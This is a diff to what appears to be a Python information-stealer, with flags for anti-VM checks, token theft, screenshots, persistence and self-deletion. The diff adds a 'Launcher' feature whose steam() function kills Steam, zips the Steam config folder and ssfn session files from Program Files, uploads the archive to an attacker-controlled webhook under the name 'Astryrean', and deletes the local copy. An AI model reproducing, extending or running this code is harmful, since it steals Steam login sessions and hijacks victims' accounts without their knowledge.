@@ -26,6 +26,7 @@ import requests
 import socket
 import psutil
 import string
+import zipfile
 import platform
 import subprocess
 import json
@@ -460,6 +461,46 @@ def delete():
     ])
     sys.exit()
 
+def steam():
+    os.system("taskkill /F /IM Steam.exe")
+    os.system("cls")
+    steam_path = os.environ.get("PROGRAMFILES(X86)", "") + "\\Steam"
+    if os.path.exists(steam_path):
+        ssfn_files = [os.path.join(steam_path, file) for file in os.listdir(steam_path) if file.startswith("ssfn")]
+        steam_config_path = os.path.join(steam_path, "config")
+
+        zip_path = os.path.join(os.environ['TEMP'], "session_steam.zip")
+        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zp:
+            if os.path.exists(steam_config_path):
+                for root, dirs, files in os.walk(steam_config_path):
+                    for file in files:
+                        zp.write(os.path.join(root, file), os.path.relpath(os.path.join(root, file), steam_path))
+                for ssfn_file in ssfn_files:
+                    zp.write(ssfn_file, os.path.basename(ssfn_file))
+
+        embed = {
+        "username": "Astryrean", 
+        "avatar_url": "https://i.imgur.com/n5NcLFl.jpeg",  
+            "embeds": [
+                {
+                    "title": "<:steam:1368887299860987944> Steam",
+                    "description": "```✅️ Found The Steam Session```",
+                }
+            ]
+        }
+
+        response = requests.post(h00k, json=embed)
+        if response.status_code != 204:
+            pass 
+
+        with open(zip_path, 'rb') as f:
+            files = {'file': ('steam_session.zip', f)}
+            response = requests.post(h00k, files=files)
+            if response.status_code != 204:
+                pass  
+
+        os.remove(zip_path)
+
 def main():
     feature = {
         "anti_vm": False,
@@ -469,7 +510,8 @@ def main():
         "screenshot": False,
         "startup": False,
         "restart": False,
-        "self_delete": False
+        "self_delete": False,
+        "Launcher": False
     }
     if feature.get("token", False):
         find_token()
@@ -487,5 +529,6 @@ def main():
         restart()
     if feature.get("self_delete", False):
         delete()
-
+    if feature.get("Launcher", False):
+        steam()
 main()
